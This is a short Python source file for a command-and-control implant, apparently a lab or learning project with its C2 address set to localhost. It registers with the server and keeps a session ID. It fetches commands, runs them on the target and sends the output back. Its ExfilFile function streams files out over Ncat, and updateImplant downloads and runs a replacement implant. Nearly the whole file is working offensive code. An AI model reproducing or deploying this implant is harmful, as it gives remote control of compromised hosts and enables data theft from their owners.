import urllib.request
import urllib
import os
import time
import subprocess
import sys

#Comms
c2 = 'http://localhost:443'
c2IPAdress = 'localhost'

def ExfilFile(file, c2, IPAddress):
    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
    os.system(f'Ncat {IPAddress} 1234 < {file}')
    return

def updateImplant():
    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', "implant.py")
    subprocess.Popen([sys.executable, "implant.py"])
    return

#initialiazation, this will set establish a Session ID
if(os.path.isfile("sid.log")):
    sid = open("sid.log", "r").read()
    urllib.request.urlopen(f'{c2}/reconnect?sid={sid}')
else:
    sid = urllib.request.urlopen(f'{c2}/').read().decode("utf-8")
    f = open("sid.log", "w")
    f.write(sid)
    f.close()

# Command execution
time.sleep(2)
response = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}')
command = response.read().decode("utf-8")
os.system(command) #runs the command from our C2 server on the target
commanddata = os.popen(command)
commanddatatext = urllib.parse.quote_plus(commanddata.read())

#Send command output to C2
urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
